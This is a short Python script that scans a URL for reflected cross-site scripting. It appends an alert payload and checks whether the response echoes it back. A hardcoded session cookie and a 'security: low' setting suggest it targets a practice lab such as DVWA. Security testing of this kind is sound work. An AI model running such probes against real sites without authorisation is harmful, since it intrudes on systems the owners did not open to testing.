import requests
import urllib.parse
import argparse

def text_xss(url):
    payload = '<script>alert("XSS")</script>'
    try:
        # Check if the URL is valid
        result = urllib.parse.urlparse(url)
        if not all([result.scheme, result.netloc]):
            raise ValueError("Invalid URL")
        #To use it you have to change the session cookie for yours
        cookies = {
            "PHPSESSID":"2acijd30vevs4hvhmbdefq42t7",
            "security":"low"
        }
        # Send the request
        response = requests.get(str(url) + str(payload), cookies=cookies, timeout=5)
        response.raise_for_status()  # Raise an exception for HTTP errors
        # Check if the payload is reflected in the response
        if payload in response.text:
            print(f"Vulnerable to XSS at {url}")
        else:
            print(f"Not vulnerable to XSS at {url}")
            print(response.text)
    except requests.exceptions.HTTPError as http_err:
        print(f"HTTP error occurred: {http_err}")
    except requests.exceptions.ConnectionError as conn_err:
        print(f"Error connecting to {url}: {conn_err}")
    except requests.exceptions.Timeout as time_out_err:
        print(f"Timeout error: {time_out_err}")
    except requests.exceptions.RequestException as err:
        print(f"Error scanning {url}: {err}")
    except ValueError as val_err:
        print(f"Invalid URL: {val_err}")
    except Exception as err:
        print(f"An unexpected error occurred: {err}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Script para escanear XSS')
    parser.add_argument('--url', help='URL to scan', required=True)
    args = parser.parse_args()
    text_xss(args.url)
